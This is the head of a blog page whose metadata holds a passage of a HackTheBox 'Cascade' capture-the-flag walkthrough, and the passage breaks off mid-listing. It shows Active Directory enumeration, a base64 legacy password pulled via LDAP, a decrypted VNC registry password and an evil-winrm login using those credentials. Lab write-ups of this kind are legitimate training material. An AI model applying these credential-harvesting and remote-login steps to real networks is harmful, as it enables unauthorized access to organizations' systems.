<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>HackTheBox Cascade | DC0deZer0</title>
<meta name="generator" content="Jekyll v4.2.0">
<meta property="og:title" content="HackTheBox Cascade">
<meta name="author" content="Jeevan Chandra">
<meta property="og:locale" content="en_US">
<meta name="description" content="Cascade is a windows machine on Hackthebox, made by VBSCRUB which I personally a big fan of him. This box is one hell of an awsome machine made by him. Info Cascade   OS: Windows Difficulty: Medium Points: 30 Release: 28 Mar 2020 IP: 10.10.10.182 Let’s start hacking into CASCADE As always hacking starts with NMAP scan. nmap -sV -A -T4 -Pn -sC -vvv cascade.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 02:52 EDT NSE: Loaded 151 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed Initiating SYN Stealth Scan at 02:52 Scanning cascade.htb (10.10.10.182) [1000 ports] Discovered open port 445/tcp on 10.10.10.182 Discovered open port 53/tcp on 10.10.10.182 Discovered open port 135/tcp on 10.10.10.182 Discovered open port 139/tcp on 10.10.10.182 Discovered open port 49157/tcp on 10.10.10.182 Discovered open port 49154/tcp on 10.10.10.182 Discovered open port 3268/tcp on 10.10.10.182 Discovered open port 88/tcp on 10.10.10.182 Discovered open port 49165/tcp on 10.10.10.182 Discovered open port 636/tcp on 10.10.10.182 Discovered open port 49155/tcp on 10.10.10.182 Discovered open port 389/tcp on 10.10.10.182 Discovered open port 49158/tcp on 10.10.10.182 Discovered open port 3269/tcp on 10.10.10.182 Completed SYN Stealth Scan at 02:52, 9.90s elapsed (1000 total ports) Initiating Service scan at 02:52 Scanning 14 services on cascade.htb (10.10.10.182) Completed Service scan at 02:53, 56.75s elapsed (14 services on 1 host) Initiating OS detection (try #1) against cascade.htb (10.10.10.182) Retrying OS detection (try #2) against cascade.htb (10.10.10.182) Initiating Traceroute at 02:53 Completed Traceroute at 02:53, 0.22s elapsed Initiating Parallel DNS resolution of 2 hosts. at 02:53 Completed Parallel DNS resolution of 2 hosts. at 02:53, 13.11s elapsed DNS resolution of 1 IPs took 13.11s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0] NSE: Script scanning 10.10.10.182. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:53 NSE Timing: About 99.95% done; ETC: 02:54 (0:00:00 remaining) Completed NSE at 02:54, 40.20s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:54 NSE Timing: About 97.32% done; ETC: 02:54 (0:00:01 remaining) NSE Timing: About 98.21% done; ETC: 02:55 (0:00:01 remaining) NSE Timing: About 99.11% done; ETC: 02:55 (0:00:01 remaining) Completed NSE at 02:56, 120.90s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Nmap scan report for cascade.htb (10.10.10.182) Host is up, received user-set (0.18s latency). Scanned at 2020-07-23 02:52:18 EDT for 246s Not shown: 986 filtered ports Reason: 986 no-responses PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open tcpwrapped syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49165/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (91%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.80%E=4%D=7/23%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F193499%P=x86_64-pc-linux-gnu) SEQ(SP=106%GCD=1%ISR=10C%TI=I%II=I%TS=7) OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11) WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000) ECN(R=Y%DF=Y%TG=80%W=2000%O=M54DNW8NNS%CC=N%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Uptime guess: 0.479 days (since Wed Jul 22 15:26:52 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=253 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 3m22s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 62331/tcp): CLEAN (Timeout) | Check 2 (port 51409/tcp): CLEAN (Timeout) | Check 3 (port 10882/udp): CLEAN (Timeout) | Check 4 (port 53799/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-07-23T06:57:09 |_ start_date: 2020-07-22T19:30:40 TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 184.36 ms 10.10.14.1 2 184.52 ms cascade.htb (10.10.10.182) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 248.12 seconds Raw packets sent: 2074 (94.964KB) | Rcvd: 144 (20.275KB) Enum4linux enum4linux -a cascade.htb Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 23 02:47:55 2020 ========================== | Target Information | ========================== Target ........... cascade.htb RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none =================================================== | Enumerating Workgroup/Domain on cascade.htb | =================================================== [E] Can't find workgroup/domain =========================================== | Nbtstat Information for cascade.htb | =========================================== Looking up status of 10.10.10.182 No reply from 10.10.10.182 ==================================== | Session Check on cascade.htb | ==================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server cascade.htb allows sessions using username '', password '' Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name: ========================================== | Getting domain SID for cascade.htb | ========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: CASCADE Domain Sid: S-1-5-21-3332504370-1206983947-1165150453 [+] Host is part of a domain (not a workgroup) ===================================== | OS information on cascade.htb | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458. Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for cascade.htb from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467. [+] Got OS info for cascade.htb from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================ | Users on cascade.htb | ============================ Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull Name: Adrian Turnbull Desc: (null) index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc Desc: (null) index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson Name: Ben Hanson Desc: (null) index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc Name: BackupSvc Desc: (null) index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman Name: David Burman Desc: (null) index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe Name: Edward Crowe Desc: (null) index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft Name: Ian Croft Desc: (null) index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen Name: Joseph Allen Desc: (null) index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand Name: John Goodhand Desc: (null) index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield Name: James Wakefield Desc: (null) index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson Name: Ryan Thompson Desc: (null) index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson Name: Stephanie Hickson Desc: (null) index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith Name: Steve Smith Desc: (null) index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util Name: Util Desc: (null) Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f] ======================================== | Share Enumeration on cascade.htb | ======================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on cascade.htb =================================================== | Password Policy Information for cascade.htb | =================================================== [+] Attaching to cascade.htb using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] CASCADE [+] Builtin [+] Password Info for Domain: CASCADE [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501. [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 5 ============================= | Groups on cascade.htb | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] [+] Getting builtin group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Guests' (RID: 546) has member: CASCADE\CascGuest Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users Group 'Users' (RID: 545) has member: CASCADE\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44e] group:[IT] rid:[0x459] group:[Production] rid:[0x45a] group:[HR] rid:[0x45b] group:[AD Recycle Bin] rid:[0x45f] group:[Backup] rid:[0x460] group:[Temps] rid:[0x463] group:[WinRMRemoteWMIUsers__] rid:[0x465] group:[Remote Management Users] rid:[0x466] group:[Factory] rid:[0x46c] group:[Finance] rid:[0x46d] group:[Audit Share] rid:[0x471] group:[Data Share] rid:[0x472] [+] Getting local group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'HR' (RID: 1115) has member: CASCADE\s.hickson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'IT' (RID: 1113) has member: CASCADE\arksvc Group 'IT' (RID: 1113) has member: CASCADE\s.smith Group 'IT' (RID: 1113) has member: CASCADE\r.thompson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593. [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[DnsUpdateProxy] rid:[0x44f] [+] Getting domain group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Domain Users' (RID: 513) has member: CASCADE\administrator Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson Group 'Domain Users' (RID: 513) has member: CASCADE\util Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Domain Guests' (RID: 514) has member: CASCADE\CascGuest Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\administrator Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Using Ldap Search— Intresting findings from ldapsearch dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Ryan Thompson sn: Thompson givenName: Ryan distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local instanceType: 4 whenCreated: 20200109193126.0Z whenChanged: 20200323112031.0Z displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson objectGUID:: LfpD6qngUkupEy9bFXBBjA== userAccountControl: 66048 badPwdCount: 8 codePage: 0 countryCode: 0 badPasswordTime: 132299219591809760 lastLogoff: 0 lastLogon: 132299203623153712 pwdLastSet: 132230718862636251 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== accountExpires: 9223372036854775807 logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z dSCorePropagationData: 20200119174753.0Z dSCorePropagationData: 20200119174719.0Z dSCorePropagationData: 20200119174508.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0 This seems more intresting.. cascadeLegacyPwd: clk0bjVldmE= Decoding with the base64 echo &quot;clk0bjVldmE=&quot; | base64 -d rY4n5eva Using smbclient for further more enumeration! smbclient -L cascade.htb -U r.thompson Enter WORKGROUP\r.thompson's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Audit$ Disk C$ Disk Default share Data Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share print$ Disk Printer Drivers SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available Some more intresting findings! smbclient //cascade.htb/Data -U r.thompson Enter WORKGROUP\r.thompson's password: Try &quot;help&quot; to get a list of possible commands. smb: \&gt; ls . D 0 Sun Jan 26 22:27:34 2020 .. D 0 Sun Jan 26 22:27:34 2020 Contractors D 0 Sun Jan 12 20:45:11 2020 Finance D 0 Sun Jan 12 20:45:06 2020 IT D 0 Tue Jan 28 13:04:51 2020 Production D 0 Sun Jan 12 20:45:18 2020 Temps D 0 Sun Jan 12 20:45:15 2020 13106687 blocks of size 4096. 7806882 blocks available smb: \&gt; cd It smb: \It\&gt; ls . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Email Archives D 0 Tue Jan 28 13:00:30 2020 LogonAudit D 0 Tue Jan 28 13:04:40 2020 Logs D 0 Tue Jan 28 19:53:04 2020 Temp D 0 Tue Jan 28 17:06:59 2020 13106687 blocks of size 4096. 7806882 blocks available After moving into the dir Email Archives………. smb: \IT\Email Archives\&gt; ls . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Meeting_Notes_June_2018.html A 2522 Tue Jan 28 13:04:51 2020 13106687 blocks of size 4096. 7793283 blocks available smb: \IT\Email Archives\&gt; get Meeting_Notes_June_2018.html getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec) cat Meeting_Notes_June_2018.html &lt;p&gt;-- New production network will be going live on Wednesday so keep an eye out for any issues. &lt;/p&gt; &lt;p&gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt; &lt;p&gt;-- The winner of the �Best GPO� competition will be announced on Friday so get your submissions in soon.&lt;/p&gt; So from here I moved into the Temp folder and found a user S.Smith. smb: \IT\Temp\s.smith\&gt; ls . D 0 Wed Jan 29 05:00:01 2020 .. D 0 Wed Jan 29 05:00:01 2020 VNC Install.reg A 2680 Wed Jan 29 04:27:44 2020 13106687 blocks of size 4096. 7793278 blocks available Here there is a registery found VNC Install.reg. let’s see what’s inside that. cat VNC Install.reg ��Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC] [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server] &quot;ExtraPorts&quot;=&quot;&quot; &quot;QueryTimeout&quot;=dword:0000001e &quot;QueryAcceptOnTimeout&quot;=dword:00000000 &quot;LocalInputPriorityTimeout&quot;=dword:00000003 &quot;LocalInputPriority&quot;=dword:00000000 &quot;BlockRemoteInput&quot;=dword:00000000 &quot;BlockLocalInput&quot;=dword:00000000 &quot;IpAccessControl&quot;=&quot;&quot; &quot;RfbPort&quot;=dword:0000170c &quot;HttpPort&quot;=dword:000016a8 &quot;DisconnectAction&quot;=dword:00000000 &quot;AcceptRfbConnections&quot;=dword:00000001 &quot;UseVncAuthentication&quot;=dword:00000001 &quot;UseControlAuthentication&quot;=dword:00000000 &quot;RepeatControlAuthentication&quot;=dword:00000000 &quot;LoopbackOnly&quot;=dword:00000000 &quot;AcceptHttpConnections&quot;=dword:00000001 &quot;LogLevel&quot;=dword:00000000 &quot;EnableFileTransfers&quot;=dword:00000001 &quot;RemoveWallpaper&quot;=dword:00000001 &quot;UseD3D&quot;=dword:00000001 &quot;UseMirrorDriver&quot;=dword:00000001 &quot;EnableUrlParams&quot;=dword:00000001 &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f &quot;AlwaysShared&quot;=dword:00000000 &quot;NeverShared&quot;=dword:00000000 &quot;DisconnectClients&quot;=dword:00000001 &quot;PollingInterval&quot;=dword:000003e8 &quot;AllowLoopback&quot;=dword:00000000 &quot;VideoRecognitionInterval&quot;=dword:00000bb8 &quot;GrabTransparentWindows&quot;=dword:00000001 &quot;SaveLogToAllUsersPath&quot;=dword:00000000 &quot;RunControlInterface&quot;=dword:00000001 &quot;IdleTimeout&quot;=dword:00000000 &quot;VideoClasses&quot;=&quot;&quot; &quot;VideoRects&quot;=&quot;&quot; &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f after cracking the hex we get the password as sT333ve2 Login as S.Smith evil-winrm -i cascade.htb -u s.smith -p sT333ve2 Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\s.smith\Documents&gt; Getting User.txt *Evil-WinRM* PS C:\Users\s.smith\Documents&gt; cd .. *Evil-WinRM* PS C:\Users\s.smith&gt; cd Desktop *Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; type user.txt 36e**************************9e513 *Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; Privilege Escalaition Part 1: Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; whoami /all USER INFORMATION ---------------- User Name SID =============== ============================================== cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\Audit Share Alias S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Nothing much in this.. Proceding with Dir enumeration. *Evil-WinRM* PS C:\&gt; cd Shares *Evil-WinRM* PS C:\Shares&gt; cd Audit *Evil-WinRM* PS C:\Shares\Audit&gt; ls Directory: C:\Shares\Audit Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/28/2020 9:40 PM DB d----- 